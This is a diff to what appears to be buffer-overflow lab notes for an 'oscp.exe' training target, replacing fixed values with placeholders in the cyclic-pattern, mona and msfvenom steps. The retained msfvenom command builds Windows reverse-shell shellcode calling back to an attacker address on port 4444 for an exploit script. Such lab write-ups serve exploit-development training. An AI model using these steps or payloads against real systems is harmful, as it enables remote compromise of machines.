@@ -79,13 +79,12 @@ except:
 
 Use `cyclic` to create a cyclic pattern 400 bytes longer than the length of bytes that crashed the server:
 ```
-user@arch:~$ cyclic 600
-aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaad
+user@arch:~$ cyclic <length>
 ```
 
 The `oscp.exe` should crash so use this Immunity Debugger command to find the cyclic pattern:
 ```
-!mona findmsp -distance 600
+!mona findmsp -distance <length>
 ```
 
 We will see a line that contains:
@@ -133,7 +132,7 @@ Update the `exploit.py` script and set the `retn` variable to one of these addre
 ## Generate Payload
 Run the following `msfvenom` command and specify the badchars with `-b`
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=10.6.23.1 LPORT=4444 EXITFUNC=thread -b "\x00" -f c
+msfvenom -p windows/shell_reverse_tcp LHOST=10.6.23.1 LPORT=4444 EXITFUNC=thread -b <barchars> -f c
 ```
 
 Copy these bytes into the `payload` variable in `exploit.py`
